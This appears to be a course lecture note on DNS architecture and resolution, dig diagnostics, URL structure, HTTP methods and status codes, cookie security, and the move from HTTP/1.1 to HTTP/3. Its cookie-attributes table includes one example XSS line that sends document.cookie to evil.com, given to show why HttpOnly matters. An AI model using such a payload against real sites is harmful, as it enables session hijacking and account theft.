# Application Layer Protocols — Domain Name System (DNS) & HTTP Architecture
**Term:** Term 5 | **Subject:** CN | **Note ID:** `cn-t5-l09`
**Last Updated:** 2026-10-13T00:00:00Z

## Abstract & Summary
An exhaustive masterclass on foundational Application Layer protocols powering the modern Web. Covers the Domain Name System (DNS) distributed database and iterative resolution mechanics, URL anatomy, HTTP stateless architecture and method semantics, cryptographic cookie security and session state management, and the multi-generational transport evolution from HTTP/1.1 to HTTP/2 multiplexing and HTTP/3 QUIC.

## Learning Objectives
- Explain the hierarchical, decentralized architecture of the Domain Name System (DNS) from Root to TLD to Authoritative servers.
- Differentiate between recursive and iterative DNS queries and trace the complete 8-stage resolution workflow.
- Interpret DNS resource records (A, AAAA, CNAME, MX, NS, TXT, PTR, SOA) and execute DNS diagnostics with dig and nslookup.
- Deconstruct Uniform Resource Locators (URLs) and explain why URL fragments are never transmitted over the wire.
- Analyze the HTTP request/response model, evaluate HTTP methods for Safety and Idempotency, and categorize 1xx through 5xx status codes.
- Implement stateful session tracking on top of stateless HTTP using secure cookies (HttpOnly, Secure, SameSite) and contrast cookie vs. server-side session stores.
- Trace the architectural evolution of the Web from HTTP/1.0 to HTTP/1.1 (Keep-Alive, HOL blocking), HTTP/2 (binary framing, multiplexing, HPACK), and HTTP/3 (QUIC over UDP).

## Key Takeaways
- DNS is a distributed hierarchical database composed of 13 logical Root server clusters, Top-Level Domain (TLD) registries, and Authoritative Nameservers that translates human-readable domain names into IP addresses.
- DNS resolution uses Recursive queries between the client and resolver, and Iterative queries between the resolver and the hierarchical DNS servers.
- Resource record types serve specific functions: A (IPv4), AAAA (IPv6), CNAME (canonical alias), MX (mail server priority), NS (zone delegation), and TXT (SPF/DKIM/DMARC domain authentication).
- HTTP is a stateless, text-based (in v1.x) request-response protocol; methods are classified as Safe (read-only, no server mutation: GET, HEAD) and Idempotent (repeated execution yields identical server state: GET, PUT, DELETE).
- Cookies bridge stateless HTTP to stateful user sessions; critical security flags include HttpOnly (blocks JavaScript XSS access), Secure (HTTPS-only transmission), and SameSite=Strict/Lax (mitigates Cross-Site Request Forgery - CSRF).
- HTTP/1.1 introduced persistent TCP connections ('keep-alive') but suffered from application-layer Head-of-Line (HoL) blocking; HTTP/2 resolved this with a binary framing layer multiplexing multiple streams over a single TCP connection with HPACK compression.
- HTTP/3 replaces TCP with QUIC over UDP, eliminating transport-layer HoL blocking caused by packet loss, providing 0-RTT connection resumption, and enabling seamless connection migration when client IP addresses change.

---

## The Domain Name System (DNS): Distributed Hierarchical Architecture
### Why DNS is the Internet's Directory

Underlying network infrastructure communicates strictly via binary numerical addresses (32-bit IPv4 or 128-bit IPv6). However, humans memorise semantic domain names (e.g., `google.com`, `wikipedia.org`). In the early ARPANET era, hostnames were translated via a single centralized text file (`HOSTS.TXT`) maintained at Stanford Research Institute (SRI-NIC) and downloaded nightly via FTP. As the network expanded, this centralized design broke down under bandwidth saturation, name collisions, and lack of localized administrative control.

In 1983, Paul Mockapetris designed the **Domain Name System (DNS)** (RFC 882 / RFC 883, updated in RFC 1034 / RFC 1035): a globally distributed, decentralized, hierarchical database with localized zone delegation.

```
                                  . (Root Zone)
                                  /     |     \
                               .com   .org   .edu ... (TLDs)
                              /   \      \
                        google  amazon  wikipedia
                        /    \
                      www    mail (Authoritative Hosts)
```

### The Three Tiers of the DNS Hierarchy

1. **Root Name Servers (`.`)**:
   - Sit at the apex of the inverted DNS tree hierarchy.
   - Know the IP addresses of the Top-Level Domain (TLD) nameservers for every generic and country-code TLD (`.com`, `.net`, `.org`, `.in`, `.uk`).
   - There are **13 logical root server IP addresses** (named `a.root-servers.net` through `m.root-servers.net`), operated by 12 independent organizations (ICANN, Verisign, NASA, US Army, WIDE Project, etc.).
   - **Anycast Routing**: Although there are 13 logical IP addresses, each address is broadcast via BGP Anycast across hundreds of geographically distributed physical server clusters worldwide (over 1,500 physical root server instances), ensuring high availability and resilience against DDoS attacks.
2. **Top-Level Domain (TLD) Servers**:
   - Responsible for managing domain registries within a specific top-level domain.
   - **Generic TLDs (gTLDs)**: `.com`, `.org`, `.net`, `.edu`, `.gov` (e.g., Verisign operates `.com` and `.net`).
   - **Country-Code TLDs (ccTLDs)**: `.in` (India / NIXI), `.uk` (United Kingdom / Nominet), `.de` (Germany / DENIC).
   - TLD servers maintain the addresses of the Authoritative Nameservers for every registered second-level domain (e.g., `google.com`).
3. **Authoritative Name Servers**:
   - Maintained by domain owners or managed DNS providers (Cloudflare, AWS Route 53, Google Cloud DNS).
   - Hold the definitive, actual DNS resource records (A, AAAA, MX, CNAME) for the domain. They provide the authoritative answer (`ANSWER SECTION`).

### The Recursive Resolver (Recursive DNS)
Clients (laptops, phones) do not query Root and TLD servers directly. Instead, client operating systems query a **Recursive Resolver** provided by their ISP or public DNS services (e.g., Google `8.8.8.8`, Cloudflare `1.1.1.1`, Quad9 `9.9.9.9`). The recursive resolver acts as a proxy: it performs the complex iterative traversal of the DNS hierarchy on behalf of the client and caches results locally.

**Citations & References:**
- RFC 1034: Domain Names - Concepts and Facilities
- RFC 1035: Domain Names - Implementation and Specification
- Root Server Technical Operations Assn: root-servers.org Documentation

---

## Step-by-Step DNS Resolution Workflow & Query Types
### Recursive vs. Iterative Queries

A critical distinction in DNS architecture is the query delegation model:

- **Recursive Query**: The querying entity asks: *"Give me the complete IP address or tell me it does not exist; do not return intermediate referrals!"* The queried server assumes the burden of finding the answer. Client stub resolvers send recursive queries to Recursive Resolvers.
- **Iterative Query**: The querying entity asks: *"Give me the answer, or refer me to the next nameserver that knows more!"* If the queried server does not know the answer, it returns a **Referral** containing the NS and IP addresses of the next level down. Recursive Resolvers send iterative queries to Root, TLD, and Authoritative servers.

```
  [ Client Browser ]
         │ (1) Recursive Query: "What is www.google.com?"
         ▼
  [ Recursive Resolver (e.g., 8.8.8.8) ]
         ├── (2) Iterative Query ──► [ Root Server (.) ]
         │◄── (3) Referral: "Ask .com TLD at 192.5.6.30"
         │
         ├── (4) Iterative Query ──► [ .com TLD Server ]
         │◄── (5) Referral: "Ask ns1.google.com at 216.239.32.10"
         │
         ├── (6) Iterative Query ──► [ Authoritative Server (ns1.google.com) ]
         │◄── (7) Answer: "www.google.com = 142.250.195.46 (TTL=300)"
         │
         ▼ (8) Final IP Returned to Browser
  [ Client connects to 142.250.195.46 via TCP/TLS ]
```

### Complete 8-Stage Resolution Trace

When a user types `https://www.google.com` into a web browser, the resolution progresses through the following sequential checkpoints:

1. **Stage 1: Browser Cache Check**
   - Modern browsers (Chrome, Firefox) maintain an internal DNS cache (e.g., `chrome://net-internals/#dns`). If the domain was resolved recently and its TTL has not expired, the cached IP is returned instantly ($0\text{ ms}$). Done.
2. **Stage 2: Operating System Resolver Cache & `/etc/hosts`**
   - If absent from browser cache, the browser makes a system call (`getaddrinfo()`).
   - The OS kernel first checks the static hosts file (`/etc/hosts` on Linux/macOS, `C:\Windows\System32\drivers\etc\hosts` on Windows). If mapped, it returns that IP.
   - Otherwise, it checks the local OS DNS cache (`systemd-resolved` or Windows DNS Client service).
3. **Stage 3: Query Local Recursive Resolver**
   - The OS sends a UDP packet (port 53) containing a **recursive query** to the configured DNS resolver (e.g., ISP gateway or `8.8.8.8`).
4. **Stage 4: Recursive Resolver Cache Check**
   - If the resolver has previously resolved `www.google.com` and the record's TTL is still valid, it returns the cached answer immediately.
5. **Stage 5: Querying the Root Server**
   - If cache miss, the resolver sends an **iterative query** to one of the 13 Root IP addresses.
   - The Root server does not know Google's IP, but replies with a **Referral** containing the NS records for the `.com` TLD servers.
6. **Stage 6: Querying the TLD Server**
   - The resolver sends an iterative query to the `.com` TLD server.
   - The `.com` TLD server responds with a **Referral** pointing to Google's authoritative nameservers (`ns1.google.com`, `ns2.google.com`) and includes **Glue Records** (A records providing the IP addresses of the nameservers themselves to prevent circular dependency).
7. **Stage 7: Querying the Authoritative Nameserver**
   - The resolver sends an iterative query to Google's authoritative nameserver (`ns1.google.com`).
   - The authoritative server returns the definitive **A Record** (`142.250.195.46`) with its Time-to-Live (`TTL=300` seconds).
8. **Stage 8: Cache and Return**
   - The resolver stores the answer in its cache for 300 seconds and returns the IP address to the client's OS, which passes it to the browser. The browser initiates the TCP 3-way handshake to `142.250.195.46:443`.

### DNS Caching Dynamics & Time To Live (TTL)
Every DNS resource record carries a **TTL** field specifying the duration in seconds that intermediate resolvers and clients are permitted to cache the record:
- **High TTL (e.g., 86,400s / 24 hours)**: Reduces query latency and offloads server traffic; however, IP changes propagate very slowly across the Internet.
- **Low TTL (e.g., 60s - 300s)**: Enables rapid traffic rerouting, failover, and zero-downtime blue-green deployments at the expense of increased DNS query volume.
- **Negative Caching (RFC 2308)**: Caching non-existence (`NXDOMAIN`). Defined in the zone's SOA record `MINIMUM` field to prevent clients from repeatedly hammering root/TLD servers for invalid domains.

**Citations & References:**
- RFC 1035: Domain Names - Implementation and Specification, Section 7 (Resolvers)
- RFC 2308: Negative Caching of DNS Queries (DNS NCACHE)
- Computer Systems: A Programmer's Perspective (Bryant & O'Hallaron), Chapter 11 (Network Programming)

---

## DNS Resource Record Anatomy & Diagnostic Tooling
### Taxonomy of DNS Resource Records (RRs)

DNS database entries are structured as **Resource Records (RRs)** defined by the tuple `(Name, Type, Value, TTL, Class)`.

| Record Type | Purpose & Semantic Role | Example Syntax (RFC Format) | Production Use Case |
| :--- | :--- | :--- | :--- |
| **A** | Address: Maps a hostname to a 32-bit **IPv4 address** | `example.com. 300 IN A 93.184.216.34` | Directing web traffic to IPv4 web servers |
| **AAAA** | Quad-A: Maps a hostname to a 128-bit **IPv6 address** | `example.com. 300 IN AAAA 2606:2800:220:1:248:1893:25c8:1946` | Dual-stack IPv6 web services |
| **CNAME** | Canonical Name: Maps an alias hostname to another domain name | `www.example.com. 300 IN CNAME example.com.` | Pointing subdomains to root domains or CDN endpoints (Cloudflare, AWS CloudFront) |
| **MX** | Mail Exchange: Specifies the mail server responsible for receiving emails for the domain | `example.com. 300 IN MX 10 mail.example.com.` | Email routing (SMTP); includes numeric priority (lower = higher priority) |
| **NS** | Name Server: Delegates a DNS zone to an authoritative nameserver | `example.com. 86400 IN NS ns1.example.com.` | Zone delegation from registrar/TLD to DNS provider |
| **TXT** | Text: Carries arbitrary human/machine-readable text data | `example.com. 300 IN TXT "v=spf1 include:_spf.google.com ~all"` | Email security (SPF, DKIM, DMARC), TLS domain ownership verification |
| **PTR** | Pointer: Maps an IP address to a canonical hostname (**Reverse DNS**) | `34.216.184.93.in-addr.arpa. IN PTR example.com.` | Spam filtering, traceroute hostname resolution, network logging |
| **SOA** | Start of Authority: Specifies zone metadata (primary NS, admin email, serial number, timers) | `example.com. IN SOA ns1.example.com. admin.example.com. (2026101301 7200 3600 1209600 300)` | Zone transfer synchronization between primary and secondary nameservers |

> [!WARNING]
> **CNAME Restriction (RFC 1912)**: A CNAME record cannot coexist with any other record for the same hostname. Therefore, you **cannot place a CNAME record at the zone apex** (`example.com`), because the apex must have SOA and NS records! Managed DNS providers offer proprietary workarounds like *CNAME Flattening* or *ALIAS* records.

### Master-Level DNS Diagnostic Tooling (`dig`)

The command-line tool `dig` (Domain Information Grok) is the universal industry standard for DNS troubleshooting:

```bash
# 1. Basic lookup for A records:
dig example.com

# 2. Query a specific DNS resolver directly (bypassing local OS resolver):
dig @8.8.8.8 example.com

# 3. Trace the full iterative resolution path from Root to Authoritative:
dig +trace example.com

# 4. Query specific record types (MX, TXT, AAAA, NS):
dig example.com MX +short
dig example.com TXT +short

# 5. Perform a Reverse DNS lookup for an IPv4 address:
dig -x 93.184.216.34

# 6. Inspect Authoritative SOA serial number for zone synchronization:
dig example.com SOA +multiline
```

#### Sample `dig +trace` Output Analysis
Executing `dig +trace` reveals the complete 4-tier traversal:
1. Query `. IN NS` $\implies$ returns root servers (`a.root-servers.net`).
2. Query root for `example.com` $\implies$ returns `.com` TLD servers (`a.gtld-servers.net`).
3. Query `.com` TLD for `example.com` $\implies$ returns authoritative nameservers (`a.iana-servers.net`).
4. Query authoritative nameserver $\implies$ returns final `A` record (`93.184.216.34`).

**Citations & References:**
- RFC 1035: Domain Names - Implementation and Specification, Section 3.3 (Standard RRs)
- RFC 1912: Common DNS Operational and Configuration Errors
- BIND 9 Administrator Reference Manual (ISC)

---

## Uniform Resource Locators (URLs) & HTTP Protocol Fundamentals
### Complete Anatomy of a Uniform Resource Locator (URL)

A Uniform Resource Locator (URL) is a standardized string format (RFC 3986) specifying both the location of an Internet resource and the mechanism used to retrieve it:

```
   https://alice:secret@www.example.com:8443/api/v1/users?role=admin&sort=desc#section-stats
   └─┬─┘   └─────┬────┘ └──────┬──────┘ └──┬─┘ └─────┬──────┘ └────────┬────────┘ └─────┬───────┘
   Scheme  User Info      Hostname        Port     Path          Query String       Fragment
```

#### Structural Components Breakdown
1. **Scheme / Protocol (`https://`)**: Defines the application layer protocol used to establish the connection (`http`, `https`, `ftp`, `ws`, `ssh`).
2. **User Information (`alice:secret@`)**: Legacy optional credentials component. Deprecated in modern browsers due to severe credential leakage risks.
3. **Hostname (`www.example.com`)**: The domain name (resolved via DNS) or literal IP address (`[2606:2800:220:1::1]` or `93.184.216.34`).
4. **Port Number (`:8443`)**: The transport layer TCP/UDP destination port. If omitted, it defaults implicitly to port **80** for `http://` and port **443** for `https://`.
5. **Hierarchical Path (`/api/v1/users`)**: The path identifying the resource on the server filesystem or application routing engine.
6. **Query String (`?role=admin&sort=desc`)**: Key-value pairs separated by `&` used to pass non-hierarchical parameters to the server. Must be percent-encoded (e.g., spaces converted to `%20` or `+`).
7. **Fragment Identifier (`#section-stats`)**:

> [!IMPORTANT]
> **The Wire Invariant of URL Fragments**: The fragment identifier (`#section-stats`) is **NEVER sent over the network to the web server**! It is processed strictly client-side by the browser rendering engine to scroll to an HTML element with `id="section-stats"` or handle client-side Single Page Application (SPA) routing.

**Citations & References:**
- RFC 3986: Uniform Resource Identifier (URI): Generic Syntax
- WHATWG URL Living Standard: https://url.spec.whatwg.org/
- MDN Web Docs: What is a URL?

---

## HTTP Methods, Idempotence, Safety & Status Code Taxonomy
### The Fundamental Properties of HTTP

The **HyperText Transfer Protocol (HTTP)** is an application-layer request-response protocol designed by Tim Berners-Lee in 1989 (RFC 1945, RFC 2616, RFC 7230, RFC 9110). HTTP possesses three immutable core properties:
1. **Stateless**: The server retains zero conversational state or memory between requests. Every request is processed entirely in isolation.
2. **Client-Server Architecture**: The client initiates requests; the server responds. The server cannot initiate communication in basic HTTP/1.1.
3. **Extensible through Headers**: Key-value metadata headers allow seamless evolution (caching, authentication, compression, cookies).

### HTTP Methods: Safety and Idempotence Semantics

In RESTful API design and RFC 9110, HTTP methods are strictly characterized by **Safety** and **Idempotence**:
- **Safe Method**: A method that does NOT alter the server's resource state. Safe methods are essentially read-only.
- **Idempotent Method**: A method where making $N$ identical requests has the **exact same intended effect on server state** as making $1$ request ($f(f(x)) = f(x)$).

```
                 ┌────────────────────────────────────────────────────────┐
                 │                    HTTP METHOD MATRIX                  │
                 ├────────────┬──────────┬─────────────┬──────────────────┤
                 │ Method     │ Safe?    │ Idempotent? │ Primary Purpose  │
                 ├────────────┼──────────┼─────────────┼──────────────────┤
                 │ GET        │ YES      │ YES         │ Retrieve data    │
                 │ HEAD       │ YES      │ YES         │ Headers only     │
                 │ OPTIONS    │ YES      │ YES         │ Query capabilities│
                 │ PUT        │ NO       │ YES         │ Full replace     │
                 │ DELETE     │ NO       │ YES         │ Remove resource  │
                 │ POST       │ NO       │ NO          │ Create / process │
                 │ PATCH      │ NO       │ NO          │ Partial update   │
                 └────────────┴──────────┴─────────────┴──────────────────┘
```

#### Why PUT is Idempotent while POST is Not:
- If a client sends `PUT /users/42` with `{ "name": "Alice" }` five times, user 42 has name "Alice" after the first request and continues to have name "Alice" after all five requests. Server state is identical.
- If a client sends `POST /orders` with `{ "item": "Laptop" }` five times, five distinct orders are created, charging the customer credit card five separate times. Repeated requests alter server state non-idempotently.

#### PUT vs. PATCH:
- `PUT /users/42`: Completely replaces the resource. Any omitted fields are reset or deleted.
- `PATCH /users/42`: Applies a partial delta (e.g., `{ "email": "new@corp.com" }`). Modifies only the specified field while preserving all other properties.

### Comprehensive HTTP Status Code Taxonomy

Status codes are 3-digit integers categorized into five classes:

```
1xx Informational ──► Protocol handshake, switching, intermediate status
2xx Success       ──► Request successfully received, understood, accepted
3xx Redirection   ──► Client must take further action to complete request
4xx Client Error  ──► Client issued malformed, unauthorized, or invalid request
5xx Server Error  ──► Server encountered error or failed to satisfy valid request
```

#### Critical Production Status Codes

| Code | Reason Phrase | Category | Detailed Engineering Semantic |
| :--- | :--- | :--- | :--- |
| **200** | OK | Success | Standard successful response. |
| **201** | Created | Success | Resource was created (typically in response to `POST`). Includes `Location` header. |
| **204** | No Content | Success | Action succeeded, but response body is intentionally empty (common in `DELETE` or `PUT`). |
| **301** | Moved Permanently | Redirection | The resource has permanently migrated to a new URI specified in `Location`. Search engines transfer SEO equity; browsers aggressively cache the new URI. |
| **302** | Found | Redirection | Temporary redirect. Browsers follow `Location` but search engines maintain original URL. |
| **304** | Not Modified | Redirection | Conditional GET returned: cached resource is still fresh (`ETag` / `If-None-Match`). Zero body transmitted! |
| **400** | Bad Request | Client Error | Malformed syntax, invalid JSON payload, or unparseable headers. |
| **401** | Unauthorized | Client Error | **Authentication required**. The client has not provided valid credentials (missing or invalid `Authorization` header). |
| **403** | Forbidden | Client Error | **Authorization denied**. The server knows the client's identity, but the client does NOT possess permission to access the resource. |
| **404** | Not Found | Client Error | The requested URI does not map to any resource on the server. |
| **429** | Too Many Requests| Client Error | Client exceeded rate limits (RFC 6585). Often accompanies `Retry-After` header. |
| **500** | Internal Server Error| Server Error | Unhandled exception or catastrophic failure in server application code. |
| **502** | Bad Gateway | Server Error | Reverse proxy (Nginx, Cloudflare) received an invalid response from upstream origin server. |
| **503** | Service Unavailable| Server Error | Server is overloaded, experiencing maintenance, or downstream pool is exhausted. |
| **504** | Gateway Timeout | Server Error | Reverse proxy timed out waiting for upstream application server (e.g., Node.js / FastAPI hung). |

**Citations & References:**
- RFC 9110: HTTP Semantics (Fielding, Nottingham, Reschke, June 2022)
- RFC 7231: Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content
- MDN Web Docs: HTTP Status Codes Reference

---

## Stateful Applications over Stateless HTTP: Cookies, Sessions & Security
### The Stateless Dilemma & The Cookie Solution

Because HTTP is strictly stateless, when a user logs in via `POST /login`, the server authenticates the credentials and responds. However, when the user subsequently visits `GET /dashboard`, HTTP retains zero historical memory. Without a state mechanism, the user would be forced to re-enter their username and password with every single click.

In 1994, Lou Montulli invented **HTTP Cookies** (RFC 6265) to inject stateful sessions into stateless HTTP.

```
 Client (Browser)                                        Server (Backend / Redis)
        │ (1) POST /login { user: "alice", pass: "***" }          │
        ├────────────────────────────────────────────────────────►│
        │                                                         │ Verify password
        │                                                         │ Generate Session ID: "s_abc123"
        │ (2) HTTP/1.1 200 OK                                     │ Store in Redis: s_abc123 ─► user: 42
        │     Set-Cookie: session_id=s_abc123; HttpOnly; Secure;  │
        │                 SameSite=Strict; Path=/; Max-Age=86400  │
        │◄────────────────────────────────────────────────────────┤
        │ Store in Browser Secure Cookie Jar                      │
        │                                                         │
        │ (3) GET /dashboard                                      │
        │     Cookie: session_id=s_abc123                         │
        ├────────────────────────────────────────────────────────►│ Look up s_abc123 in Redis
        │                                                         │ Recognized as user 42!
        │ (4) HTTP/1.1 200 OK (Render Alice's Dashboard)          │
        │◄────────────────────────────────────────────────────────┤
```

### Cookie Security Attributes: Production Defense Matrix

Cookies represent active user authentication tokens. If compromised, an attacker can impersonate the user (Session Hijacking). Modern production web security mandates four critical cookie attributes:

| Attribute | Security Protection & Impact | What Happens if Omitted? |
| :--- | :--- | :--- |
| **`HttpOnly`** | **Mitigates Cross-Site Scripting (XSS)**. Instructs the browser that client-side JavaScript (`document.cookie`) CANNOT read or access this cookie. | An attacker injecting malicious JavaScript via XSS can execute `fetch('https://evil.com?c=' + document.cookie)` and instantly steal the session! |
| **`Secure`** | **Mitigates Man-in-the-Middle (MitM) Interception**. Instructs the browser to transmit the cookie ONLY over encrypted TLS (`https://`) connections. | The browser will send the cookie in plaintext if the user accidentally navigates to `http://`, exposing the session token on public Wi-Fi. |
| **`SameSite=Strict`** | **Mitigates Cross-Site Request Forgery (CSRF)**. The cookie is NEVER attached to requests originating from external third-party domains (even if clicking a link). | Malicious websites can trick the user's browser into executing authenticated transactions (e.g., `POST /transfer-funds`) without their knowledge. |
| **`SameSite=Lax`** | Permitted on safe top-level navigations (e.g., following a link from Google search), but blocked on cross-site form POSTs and AJAX. Good balance of UX and security. | Standard default in modern Chromium browsers. |
| **`Max-Age=N`** | Specifies exact lifetime in seconds before the cookie is automatically purged. | If omitted, becomes a *Session Cookie* purged when the browser window closes. |
| **`Domain` / `Path`** | Restricts cookie transmission to specific domain hierarchies (e.g., `.corp.com`) and URL paths (`/api`). | Defaults to current origin host only. |

### Cookies vs. Server-Side Sessions vs. JWT

1. **Cookie vs. Server-Side Session**:
   - The cookie stores only an opaque, cryptographically random **Session Identifier** (`s_abc123`, ~32 bytes).
   - The actual sensitive user data (user ID, roles, shopping cart items) is stored server-side in a fast database or key-value store (e.g., Redis, Memcached).
   - Storing user profile data directly inside client cookies is dangerous (size limit of 4 KB, security risks).
2. **JSON Web Tokens (JWT) & Stateless Auth**:
   - Alternatively, modern APIs utilize signed tokens (`Authorization: Bearer <JWT>`).
   - A JWT contains cryptographically signed user claims (`{ "sub": 42, "role": "admin" }`) verified with HMAC-SHA256 or RSA.
   - Benefit: Stateless; servers require no centralized Redis database.
   - Downside: Revocation is difficult before expiration; tokens cannot be invalidated instantly upon logout without maintaining blacklists.

**Citations & References:**
- RFC 6265: HTTP State Management Mechanism (Cookies)
- OWASP Session Management Cheat Sheet
- RFC 7519: JSON Web Token (JWT)

---

## Evolution of HTTP: From HTTP/1.0 to HTTP/1.1, HTTP/2, and HTTP/3 (QUIC)
### The Generational Evolution of the Web

The web has transitioned through four major protocol architectures to overcome latency and bandwidth bottlenecks as webpages evolved from simple HTML documents to complex multimedia applications.

```
┌────────────────────────────────────────────────────────────────────────┐
│                      THE EVOLUTION OF HTTP                             │
│                                                                        │
│  HTTP/1.0 (1996) ──► New TCP connection for every single asset         │
│                       (Extremely high 3-way handshake latency)         │
│                                                                        │
│  HTTP/1.1 (1997) ──► Persistent TCP Connections (Keep-Alive)           │
│                       Pipelining (Failed due to App-level HoL blocking)│
│                                                                        │
│  HTTP/2   (2015) ──► Binary Framing Layer over Single TCP Connection   │
│                       Multiplexed Streams, HPACK Compression           │
│                       (Suffers from TCP Transport-level HoL blocking)  │
│                                                                        │
│  HTTP/3   (2022) ──► QUIC Protocol over UDP                            │
│                       Zero Transport HoL blocking, 0-RTT handshakes    │
│                       Connection Migration across network switches     │
└────────────────────────────────────────────────────────────────────────┘
```

### 1. HTTP/1.0 vs. HTTP/1.1: Persistent Connections & Head-of-Line Blocking
- **HTTP/1.0 (RFC 1945)**: Opened a **separate TCP connection for every single resource** (HTML, CSS, 10 images = 12 TCP handshakes, 12 slow-start phases). Overhead was catastrophic.
- **HTTP/1.1 (RFC 2616)**: Introduced **Persistent Connections** (`Connection: keep-alive` by default). Multiple requests and responses can reuse the exact same established TCP socket.
- **The HTTP/1.1 Head-of-Line (HoL) Blocking Pathology**: Although HTTP/1.1 attempted *pipelining*, responses were strictly required to return in the exact chronological order of requests. If Request 1 (a slow database query) hangs, Requests 2, 3, and 4 queued behind it are completely blocked, regardless of how quickly they could be served. Browsers worked around this by opening 6 parallel TCP connections per domain.

### 2. HTTP/2 (RFC 7540): Binary Framing & Multiplexing
HTTP/2 discarded plaintext ASCII transmission in favor of a high-performance **Binary Framing Layer** over a **single TCP connection**:
- **Binary Framing**: Messages are broken into small binary frames (Type, Flags, Stream ID, Length, Payload: `HEADERS`, `DATA`, `SETTINGS`, `RST_STREAM`).
- **Multiplexed Streams**: Multiple independent request/response streams interleave frames concurrently over a single TCP connection. A slow response on Stream 1 no longer delays frames on Stream 3! Eliminates application-layer Head-of-Line blocking.
- **HPACK Header Compression (RFC 7541)**: Maintains a synchronized static and dynamic lookup table between client and server, transmitting only incremental header differences (diffs). Compresses redundant headers (User-Agent, Cookie) by over 85%.
- **Server Push**: Allows a server to proactively push critical assets (e.g., CSS/JS) to the client before the client explicitly parses the HTML and requests them.

### 3. HTTP/3 (RFC 9114): QUIC over UDP
Despite HTTP/2's achievements, it introduced a new vulnerability: **Transport-Layer Head-of-Line Blocking**.
Because HTTP/2 runs all multiplexed streams over a *single TCP connection*, TCP's in-order byte stream abstraction creates a bottleneck: if a single TCP packet is dropped on the physical link, TCP halts delivery of **all subsequent packets across ALL multiplexed streams** until the missing packet is retransmitted!

**HTTP/3 solves this by replacing TCP with QUIC over UDP (RFC 9000)**:
1. **Independent Streams over UDP**: QUIC implements reliable streams directly in userspace on top of UDP. If a packet on Stream 3 is dropped, only Stream 3 waits for retransmission; Streams 1, 2, 4 continue delivering data immediately with zero HoL blocking.
2. **0-RTT Connection Establishment**: Integrates TLS 1.3 cryptographic handshakes directly into the transport setup, reducing connection establishment from $3\text{ RTT}$ (TCP + TLS) to $1\text{ RTT}$ (or $0\text{ RTT}$ for returning clients).
3. **Connection Migration**: Traditional TCP connections are bound to a 4-tuple `(SrcIP, SrcPort, DstIP, DstPort)`. When a user moves from home Wi-Fi to mobile 5G cellular, the IP changes, terminating the TCP connection. QUIC identifies connections via a 64-bit **Connection ID (CID)** independent of IP addresses, allowing active video streams and downloads to continue seamlessly across network handoffs without disconnecting!

**Citations & References:**
- RFC 7540: Hypertext Transfer Protocol Version 2 (HTTP/2)
- RFC 7541: HPACK: Header Compression for HTTP/2
- RFC 9000: QUIC: A UDP-Based Multiplexed and Secure Transport
- RFC 9114: HTTP/3 (Bishop, June 2022)

---
